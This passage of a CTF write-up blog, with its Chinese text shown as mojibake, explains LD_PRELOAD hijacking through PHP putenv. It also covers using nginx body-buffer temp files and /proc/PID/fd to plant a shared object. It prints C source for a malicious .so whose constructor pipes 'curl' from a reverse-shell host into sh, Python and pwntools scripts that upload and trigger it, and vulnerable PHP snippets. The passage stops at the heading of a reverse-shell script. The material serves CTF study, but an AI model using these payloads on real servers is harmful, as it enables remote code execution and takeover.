highlight_file(__FILE__);        break;&#125; # å…¶å®è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨getuidæ¥åŠ«æŒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ©ç”¨æ„é€ å‡½æ•°constructorç¼–å†™æ¶æ„soæ–‡ä»¶"><a href="#åˆ©ç”¨æ„é€ å‡½æ•°constructorç¼–å†™æ¶æ„soæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨æ„é€ å‡½æ•°constructorç¼–å†™æ¶æ„soæ–‡ä»¶"></a>åˆ©ç”¨æ„é€ å‡½æ•°constructorç¼–å†™æ¶æ„soæ–‡ä»¶</h4><p>é¦–å…ˆå†™ä¸€ä¸ªconstruct.c</p><pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;__attribute__ ((__constructor__)) void construct(void)&#123;if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gccç¼–è¯‘æ„é€ æ¶æ„soæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC construct.c -o construct &amp;&amp; gcc --share construct -o construct.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åå°±æ˜¯å·®ä¸å¤šçš„ä»£ç åå¼¹shellï¼š</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;acf81259-d67b-47ab-a09b-3ee9c62d8143.challenge.ctf.show&#x2F;&quot;sodata&#x3D;open(&quot;construct.so&quot;,&quot;rb&quot;).read()data&#x3D;&#123;    &quot;file&quot;: &quot;&#x2F;tmp&#x2F;construct.so&quot;,    &quot;content&quot;: sodata&#125;requests.post(url+&quot;?a&#x3D;write&quot;, data&#x3D;data)requests.get(url+&quot;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;construct.so&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><img src="/images/so/conclusion.png" class="lazyload placeholder" data-srcset="/images/so/conclusion.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="æ— ä¸Šä¼ ç‚¹åˆ©ç”¨æ–¹å¼"><a href="#æ— ä¸Šä¼ ç‚¹åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ— ä¸Šä¼ ç‚¹åˆ©ç”¨æ–¹å¼"></a>æ— ä¸Šä¼ ç‚¹åˆ©ç”¨æ–¹å¼</h3><h4 id="æ€è·¯ä¸€-æƒ³åŠæ³•ä¸Šä¼ æ–‡ä»¶"><a href="#æ€è·¯ä¸€-æƒ³åŠæ³•ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="æ€è·¯ä¸€ æƒ³åŠæ³•ä¸Šä¼ æ–‡ä»¶"></a>æ€è·¯ä¸€ æƒ³åŠæ³•ä¸Šä¼ æ–‡ä»¶</h4><h5 id="å¼ºåˆ¶ä¸Šä¼ æ–‡ä»¶æ¼æ´ä»£ç "><a href="#å¼ºåˆ¶ä¸Šä¼ æ–‡ä»¶æ¼æ´ä»£ç " class="headerlink" title="å¼ºåˆ¶ä¸Šä¼ æ–‡ä»¶æ¼æ´ä»£ç "></a>å¼ºåˆ¶ä¸Šä¼ æ–‡ä»¶æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]);    system(&quot;echo ctfshow&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æ–‡ä»¶ä¸Šä¼ çš„æ ¸å¿ƒ"><a href="#æ–‡ä»¶ä¸Šä¼ çš„æ ¸å¿ƒ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ çš„æ ¸å¿ƒ"></a>æ–‡ä»¶ä¸Šä¼ çš„æ ¸å¿ƒ</h5><p>æ–‡ä»¶ä¸Šä¼ çš„æœ¬è´¨å°±æ˜¯æ•°æ®äº¤æ¢ï¼Œå°±æ˜¯å°†å®¢æˆ·ç«¯çš„æ•°æ®å‘é€åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¯¹å®¢æˆ·ç«¯æäº¤çš„æ•°æ®è¿›è¡ŒæŒä¹…åŒ–çš„è¿‡ç¨‹ã€‚æ‰€ä»¥ï¼Œå³ä½¿å½“å‰ç½‘ç«™å¯èƒ½æ²¡æœ‰æ˜ç¡®çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯ï¼Œå¦‚æœä»è¿›è¡Œäº†æ•°æ®çš„äº¤äº’ï¼Œæœ‰æ•°æ®äº¤äº’å°±ä¼šæœ‰æ•°æ®çš„å¤„ç†ï¼Œå› æ­¤å°±å¯èƒ½ä¼šæœ‰æ•°æ®çš„æŒä¹…åŒ–ï¼Œæ‰€ä»¥å¯ä»¥ä»¥æ­¤æ¥åŠ ä»¥åˆ©ç”¨ã€‚</p><h5 id="æ•°æ®äº¤äº’ç‚¹"><a href="#æ•°æ®äº¤äº’ç‚¹" class="headerlink" title="æ•°æ®äº¤äº’ç‚¹"></a>æ•°æ®äº¤äº’ç‚¹</h5><p>æ ¹æ®ä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æå‡ºï¼Œä¸€ä¸ªç®€å•çš„phpç¯å¢ƒä¸‹é¢çš„webé¢˜ç›®ï¼Œå¯èƒ½ä¼šå­˜åœ¨ä»¥ä¸‹æ•°æ®äº¤äº’ç‚¹ï¼š</p><p>1ã€åè®®å±‚æ•°æ®äº¤äº’ï¼Œtcpä¸‰æ¬¡æ¡æ‰‹ã€‚</p><p>2ã€åº”ç”¨å±‚æ•°æ®äº¤äº’ï¼š</p><p>aã€å®¢æˆ·ç«¯çš„httpåŒ…å‘é€ç»™æœåŠ¡ç«¯çš„httpç›‘å¬ç«¯å£</p><p>bã€æœåŠ¡ç«¯çš„httpæœåŠ¡å™¨å°†åŒ…è½¬å‘ç»™phpè§£é‡Šå™¨ï¼ˆPHP-FPM&#x2F;Apache Handlerï¼‰</p><p>å¾ˆæ˜æ˜¾åœ¨åè®®å±‚ä¼ è¾“å®¤ï¼Œæ•°æ®åŒ…è¿˜æ²¡æœ‰è§£åŒ…ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œæ’é™¤ã€‚  </p><p>åœ¨åº”ç”¨å±‚ä¼ è¾“æ—¶ï¼Œä¼šåšä¸€äº›ä¸´æ—¶æ–‡ä»¶çš„ä¿å­˜ï¼Œæœ‰ä¸¤ç±»ï¼š  </p><p>1ã€è¶…è¿‡nginxæœ€å°çš„æ•°æ®å¤„ç†å•å…ƒåï¼Œæ•°æ®å¹¶æ²¡æœ‰æ¥æ”¶å®Œæ¯•ï¼Œåªèƒ½å…ˆè¿›è¡Œä¿å­˜ï¼Œç­‰å¾…æ•°æ®æ¥æ”¶å®Œæ¯•ä¹‹ååœ¨è½¬å‘å‡ºå»ï¼Œåœ¨æ¥æ”¶æ•°æ®çš„è¿™æ®µæ—¶é—´ï¼Œä¼šæœ‰çŸ­æš‚çš„æ•°æ®ä¿å­˜ã€‚</p><p>2ã€phpå¤„ç†è¶…å…¨å±€å˜é‡$_FILESæ—¶ï¼Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶éƒ½æ˜¯è¢«å¼ºåˆ¶å…ˆä¿å­˜åˆ°ä¸´æ—¶ç›®å½•ï¼Œå¾…è„šæœ¬æ‰§è¡Œå®Œæ¯•åå†åˆ é™¤ï¼Œè¿™é‡Œä¹Ÿæœ‰çŸ­æš‚çš„æ•°æ®ä¿å­˜ã€‚</p><h4 id="å§¿åŠ¿ä¸€-å¼ºåˆ¶ä¸Šä¼ è„šæœ¬ï¼ˆwebå…¥é—¨-816ï¼‰"><a href="#å§¿åŠ¿ä¸€-å¼ºåˆ¶ä¸Šä¼ è„šæœ¬ï¼ˆwebå…¥é—¨-816ï¼‰" class="headerlink" title="å§¿åŠ¿ä¸€ å¼ºåˆ¶ä¸Šä¼ è„šæœ¬ï¼ˆwebå…¥é—¨-816ï¼‰"></a>å§¿åŠ¿ä¸€ å¼ºåˆ¶ä¸Šä¼ è„šæœ¬ï¼ˆwebå…¥é—¨-816ï¼‰</h4><p>å¯ä»¥å¼ºåˆ¶ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶åˆ°&#x2F;tmpç›®å½•ä¸‹ï¼Œæ‰€ä»¥åˆ©ç”¨å‰é¢æ„é€ çš„æ¶æ„soæ–‡ä»¶ï¼Œå†™ä¸ªPythonè„šæœ¬è·‘ä¸¤æ¬¡å°±è¡Œäº†ã€‚</p><p>äº¤äº’ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;48550287-fe2b-4e3b-86ad-024fe1e0e8cb.challenge.ctf.show&#x2F;?env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;&quot;files &#x3D; &#123;&#39;file&#39;: open(&#39;construct.so&#39;, &#39;rb&#39;).read()&#125;requests.post(url, files&#x3D;files)requests.post(url, files&#x3D;files)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å§¿åŠ¿äºŒ-åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶é…åˆlinuxç‰¹æ€§procï¼ˆwebå…¥é—¨-817ï¼‰"><a href="#å§¿åŠ¿äºŒ-åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶é…åˆlinuxç‰¹æ€§procï¼ˆwebå…¥é—¨-817ï¼‰" class="headerlink" title="å§¿åŠ¿äºŒ åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶é…åˆlinuxç‰¹æ€§procï¼ˆwebå…¥é—¨-817ï¼‰"></a>å§¿åŠ¿äºŒ åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶é…åˆlinuxç‰¹æ€§procï¼ˆwebå…¥é—¨-817ï¼‰</h4><h5 id="ä»€ä¹ˆæ˜¯nginxçš„bodyç¼“å­˜æœºåˆ¶"><a href="#ä»€ä¹ˆæ˜¯nginxçš„bodyç¼“å­˜æœºåˆ¶" class="headerlink" title="ä»€ä¹ˆæ˜¯nginxçš„bodyç¼“å­˜æœºåˆ¶"></a>ä»€ä¹ˆæ˜¯nginxçš„bodyç¼“å­˜æœºåˆ¶</h5><p>æ–‡æ¡£ï¼š<a href="http://tengine.taobao.org/nginx_docs/cn/docs/http/ngx_http_core_module.html">http://tengine.taobao.org/nginx_docs/cn/docs/http/ngx_http_core_module.html</a>  </p><h5 id="1ã€client-body-buffer-size"><a href="#1ã€client-body-buffer-size" class="headerlink" title="1ã€client_body_buffer_size"></a>1ã€client_body_buffer_size</h5><pre class="line-numbers language-none"><code class="language-none">client_body_buffer_sizeè¯­æ³•: client_body_buffer_size size;é»˜è®¤å€¼: client_body_buffer_size 8k|16k;ä¸Šä¸‹æ–‡: http, server, locationè¿™é‡Œè®¾ç½®è¯»å–å®¢æˆ·ç«¯è¯·æ±‚æ­£æ–‡çš„ç¼“å†²å®¹é‡ã€‚å¦‚æœè¯·æ±‚æ­£æ–‡å¤§äºç¼“å†²å®¹é‡ï¼Œæ•´ä¸ªæ­£æ–‡æˆ–è€…æ­£æ–‡çš„ä¸€éƒ¨åˆ†å°†å†™å…¥ä¸´æ—¶æ–‡ä»¶ã€‚ ç¼“å†²å¤§å°é»˜è®¤ç­‰äºä¸¤å—å†…å­˜é¡µçš„å¤§å°ï¼Œåœ¨x86å¹³å°ã€å…¶ä»–32ä½å¹³å°å’Œx86-64å¹³å°ï¼Œè¿™ä¸ªå€¼æ˜¯8Kã€‚åœ¨å…¶ä»–64ä½å¹³å°ï¼Œè¿™ä¸ªå€¼ä¸€èˆ¬æ˜¯16Kã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±ä¸Šé¢çš„æ–‡æ¡£çœ‹æ¥å¯ä»¥çŸ¥é“å½“è¯·æ±‚æ­£æ–‡ä¸€æ¬¡æ€§è¶…è¿‡16kæˆ–è€…8kï¼Œå°±ä¼šå†™å…¥ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œè¿™ä¸ªå¾ˆé‡è¦ã€‚  </p><p>è¿™é‡Œå†™å…¥äº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœèƒ½æŠŠæˆ‘ä»¬æ¶æ„æ„é€ çš„soæ–‡ä»¶å†™è¿›å»ï¼Œä¸”çŸ¥é“å­˜å‚¨çš„è·¯å¾„ï¼Œé‚£ä¹ˆå°±èƒ½é€šè¿‡putenvï¼Œè®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡å°±èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p><h5 id="2ã€client-body-in-file-only"><a href="#2ã€client-body-in-file-only" class="headerlink" title="2ã€client_body_in_file_only"></a>2ã€client_body_in_file_only</h5><pre class="line-numbers language-none"><code class="language-none">è¯­æ³•: client_body_in_file_only on | clean | off;é»˜è®¤å€¼: client_body_in_file_only off;ä¸Šä¸‹æ–‡: http, server, locationå†³å®šnginxæ˜¯å¦å°†å®¢æˆ·ç«¯è¯·æ±‚æ­£æ–‡æ•´ä¸ªå†™å…¥æ–‡ä»¶ã€‚è¿™æ¡æŒ‡ä»¤åœ¨è°ƒè¯•æ—¶ï¼Œæˆ–è€…ä½¿ç”¨$request_body_fileå˜é‡æ—¶ï¼Œ æˆ–è€…ä½¿ç”¨ngx_http_perl_moduleæ¨¡å—çš„ $r-&gt;request_body_fileæ–¹æ³•æ—¶éƒ½å¯ä»¥ä½¿ç”¨ã€‚å½“æŒ‡ä»¤å€¼è®¾ç½®ä¸ºonæ—¶ï¼Œè¯·æ±‚å¤„ç†ç»“æŸåä¸ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚å½“æŒ‡ä»¤å€¼è®¾ç½®ä¸ºcleanæ—¶ï¼Œè¯·æ±‚å¤„ç†ç»“æŸåä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3ã€client-body-temp-path"><a href="#3ã€client-body-temp-path" class="headerlink" title="3ã€client_body_temp_path"></a>3ã€client_body_temp_path</h5><pre class="line-numbers language-none"><code class="language-none">è¯­æ³•: client_body_temp_path path [level1 [level2[level3]]];é»˜è®¤å€¼: client_body_temp_path client_body_temp;ä¸Šä¸‹æ–‡: http, server, location<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å®šä¹‰å­˜å‚¨å®¢æˆ·ç«¯è¯·æ±‚æ­£æ–‡çš„ä¸´æ—¶æ–‡ä»¶çš„ç›®å½•ã€‚ æ”¯æŒåœ¨æŒ‡å®šç›®å½•ä¸‹å¤šè¾¾3å±‚çš„å­ç›®å½•ç»“æ„ã€‚æ¯”å¦‚ä¸‹é¢é…ç½®</p><blockquote><pre class="line-numbers language-none"><code class="language-none">client_body_temp_path &#x2F;spool&#x2F;nginx&#x2F;client_temp 1 2;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>  å­˜å‚¨ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„æ˜¯</p><blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;spool&#x2F;nginx&#x2F;client_temp&#x2F;7&#x2F;45&#x2F;00000123457<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>é‡ç‚¹å…³æ³¨é»˜è®¤å­˜æ”¾ä½ç½®ï¼Œæ˜¯æŒ‰ç…§é¡ºåºå­˜æ”¾çš„ï¼Œé»˜è®¤çš„è§„åˆ™å¦‚ä¸‹ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="4ã€client-max-body-size"><a href="#4ã€client-max-body-size" class="headerlink" title="4ã€client_max_body_size"></a>4ã€client_max_body_size</h5><pre class="line-numbers language-none"><code class="language-none">è¯­æ³•: client_max_body_size size;é»˜è®¤å€¼: client_max_body_size 1m;ä¸Šä¸‹æ–‡: http, server, locationè®¾ç½®å…è®¸å®¢æˆ·ç«¯è¯·æ±‚æ­£æ–‡çš„æœ€å¤§é•¿åº¦ã€‚è¯·æ±‚çš„é•¿åº¦ç”±â€œContent-Lengthâ€è¯·æ±‚å¤´æŒ‡å®šã€‚ å¦‚æœè¯·æ±‚çš„é•¿åº¦è¶…è¿‡è®¾å®šå€¼ï¼Œnginxå°†è¿”å›é”™è¯¯413 (Request Entity Too Large)åˆ°å®¢æˆ·ç«¯ã€‚ è¯·æ³¨æ„æµè§ˆå™¨ä¸èƒ½æ­£ç¡®æ˜¾ç¤ºè¿™ä¸ªé”™è¯¯ã€‚ å°†sizeè®¾ç½®æˆ0å¯ä»¥ä½¿nginxä¸æ£€æŸ¥å®¢æˆ·ç«¯è¯·æ±‚æ­£æ–‡çš„é•¿åº¦ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>æ„é€ ä¸€ä¸ªæ¶æ„soæ–‡ä»¶ï¼Œé¦–å…ˆæ˜¯éœ€è¦å°äº16kï¼Œç„¶åæ‰‹å·¥æ·»åŠ ä¸€äº›æ— å…³å­—èŠ‚åˆ°æ¶æ„soæ–‡ä»¶ä¸­ï¼Œæ‰‹å·¥è†¨èƒ€åˆ°16kä»¥ä¸Šï¼Œé‚£ä¹ˆè¿™æ ·å°±æœ‰å¯èƒ½å°†æˆ‘ä»¬çš„æ¶æ„soæ–‡ä»¶é€šè¿‡ç¼“å­˜æœºåˆ¶æš‚æ—¶ä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ã€‚  </p><p>ä½†æ˜¯ï¼Œä¹Ÿæœ‰ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œåœ¨nginxè¯»å–å®Œæ¯•ä¹‹åï¼Œè½¬å‘ä¸ªphp-fpmå°±åˆ é™¤æ‰äº†ï¼Œä¹Ÿå°±æ˜¯åœ¨phpè§£é‡Šä¹‹å‰å°±åˆ é™¤äº†ã€‚  </p><p>æœ¬åœ°æµ‹è¯•ï¼š</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨straceæ¥ç›‘æ§æµç¨‹ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">trace -f -t -e trace&#x3D;file nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨pwntoolså†™ä»£ç æ¥å‘åŒ…ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">from pwn import *import timehost&#x3D;&#39;127.0.0.1&#39;port&#x3D;80url&#x3D;remote(host,port)def getso():with open(&quot;hack.so&quot;,&quot;rb&quot;) as f:ret&#x3D;f.read()return retpayload&#x3D;getso()+b&#39;\n&#39;*30*1024send&#x3D;&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1\rHost:&#123;host&#125;\rContent-Length:&#123;length&#125;\r\r&#123;data&#125;&#39;&#39;&#39;.format(host&#x3D;host.length&#x3D;len(payload),data&#x3D;payload)url.send(send)time.sleep(10)url.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å­æœ¬åœ°æµ‹è¯•å¯ä»¥çŸ¥é“nginxçš„ç¡®ä¼šç”Ÿæˆç¼“å­˜æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨åç§’é’Ÿæ–­å¼€è¿æ¥åå°±ä¼šä½¿ç”¨unlinkæŠŠå®ƒåˆ é™¤ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶å¹¶ä¸èƒ½å¤Ÿç›´æ¥LD_PRELOAD&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;0000000001æ¥è®¿é—®è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œå› ä¸ºåˆ°phpè§£é‡Šæ‰§è¡Œæ—¶ï¼Œunlinkæ—©å·²è¢«æ‰§è¡Œï¼Œæ–‡ä»¶å·²ç»ä¸å­˜åœ¨äº†ã€‚  </p><p>ä½†æ˜¯é€šè¿‡ç›‘æ§å‘ç°ï¼Œç›´æ¥ç”Ÿæˆä¹‹åï¼Œä¼šè¢«é©¬ä¸Šåˆ é™¤æ‰ï¼Œä½†æ˜¯åˆ é™¤æ‰ä¹‹åå±…ç„¶èƒ½å¤Ÿç»§ç»­ä¿®æ”¹å’Œè®¿é—®ï¼Ÿå¦‚å›¾æ‰€ç¤ºï¼š  </p><p><img src="/images/so/delete-modify.png" class="lazyload placeholder" data-srcset="/images/so/delete-modify.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>å› æ­¤æˆ‘ä»¬æ€è€ƒæ˜¯å¦å¯ä»¥åˆ©ç”¨linuxçš„ç‰¹æ€§æ¥ä½¿ç”¨<code>/proc/PID/fd/&#123;1&#125;</code>è¿™ç§æ–‡ä»¶ï¼  </p><p>ç­”æ¡ˆæ˜¯å¯ä»¥ä½†æ˜¯æœ‰ä¸€å®šé™åˆ¶æ¡ä»¶ï¼š  </p><p>å¿…é¡»ä½¿ç”¨ç›¸åŒç”¨æˆ·åæ‰§è¡Œphpå’Œnginxæ‰å¯ä»¥ï¼Œé»˜è®¤phpæ‰§è¡Œç”¨æˆ·åä¸ºwww-dataï¼Œè€Œnginxçš„&#x2F;proc&#x2F;PID&#x2F;fdç›®å½•çš„æ‰€æœ‰è€…ä¸ºnginxçš„æ‰§è¡Œç”¨æˆ·ï¼Œé»˜è®¤ä¸ºnginxï¼Œå¦‚æœä¸¤ä¸ªç”¨æˆ·æƒé™ä¸åŒçš„æƒ…å†µä¸‹æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®çš„ã€‚  </p><h5 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h5><p>å…³äºprocï¼š<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿ, è¢«ç”¨ä½œå†…æ ¸æ•°æ®ç»“æ„çš„æ¥å£, è€Œä¸ä»…ä»…æ˜¯è§£é‡Šè¯´æ˜&#x2F;dev&#x2F;kmem.&#x2F;proc é‡Œçš„å¤§å¤šæ•°æ–‡ä»¶éƒ½æ˜¯åªè¯»çš„, ä½†ä¹Ÿå¯ä»¥é€šè¿‡å†™ä¸€äº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸å˜é‡.(Linux å†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ &#x2F;proc æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿è¡Œæ—¶è®¿é—®å†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„ã€æ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡procå¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚ä¸‹é¢åˆ—å‡ºçš„è¿™äº›æ–‡ä»¶æˆ–å­æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸æ˜¯éƒ½æ˜¯åœ¨ä½ çš„ç³»ç»Ÿä¸­å­˜åœ¨ï¼Œè¿™å–å†³äºä½ çš„å†…æ ¸é…ç½®å’Œè£…è½½çš„æ¨¡å—ã€‚å¦å¤–ï¼Œåœ¨&#x2F;procä¸‹è¿˜æœ‰ä¸‰ä¸ªå¾ˆé‡è¦çš„ç›®å½•ï¼šnetï¼Œscsiå’Œsysã€‚ Sysç›®å½•æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®æˆ–ä¿®æ”¹å†…æ ¸çš„å‚æ•°ï¼Œè€Œnetå’Œscsiåˆ™ä¾èµ–äºå†…æ ¸é…ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç³»ç»Ÿä¸æ”¯æŒscsiï¼Œåˆ™scsi ç›®å½•ä¸å­˜åœ¨ã€‚é™¤äº†ä»¥ä¸Šä»‹ç»çš„è¿™äº›ï¼Œè¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œå®ƒä»¬æ˜¯è¿›ç¨‹ç›®å½•ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨&#x2F;procä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œselfç›®å½•åˆ™æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlinkã€‚)&#x2F;proc&#x2F;pid&#x2F;fd&#x2F; è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æ¼æ´ä»£ç -3"><a href="#æ¼æ´ä»£ç -3" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\&#x2F;(\w+\&#x2F;?)+$&#x2F;&quot;, $file))&#123;shell_exec(shell_exec(&quot;cat $file&quot;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="jokerå¤§å¸ˆå‚…å†™çš„å…¨è‡ªåŠ¨åå¼¹shellè„šæœ¬"><a href="#jokerå¤§å¸ˆå‚…å†™çš„å…¨è‡ªåŠ¨åå¼¹shellè„šæœ¬" class="headerlink" title="jokerå¤§å¸ˆå‚…å†™çš„å…¨è‡ªåŠ¨åå¼¹shellè„šæœ¬"></a>jokerå¤§å¸ˆå‚…å†™çš„å…¨è‡ªåŠ¨åå¼¹shellè„šæœ¬</h5><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: 